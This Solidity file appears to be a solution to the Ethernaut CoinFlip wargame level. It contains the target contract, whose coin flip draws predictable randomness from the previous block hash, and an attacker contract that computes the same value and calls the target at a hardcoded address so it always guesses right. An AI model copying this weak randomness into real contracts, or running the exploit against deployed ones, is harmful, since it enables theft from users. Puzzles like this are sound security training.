pragma solidity ^0.4.18;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  
  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));
    
    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool side = coinFlip == 1 ? true : false;
    
    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
  
  function go() public view returns (uint) {
      return block.number;
  }
}

contract CoinFlipHack {
    CoinFlip cont = CoinFlip(0x44d2ab81a92b0e3ff9027a0921198579a930264f);
    
    function callCoinFlip() public returns (bool) {
        uint256 lastHash;
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        
        if (lastHash == blockValue) {
          revert();
        }
    
        lastHash = blockValue;
        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
        bool side = coinFlip == 1 ? true : false;
        
        return cont.flip(side);
    }
}
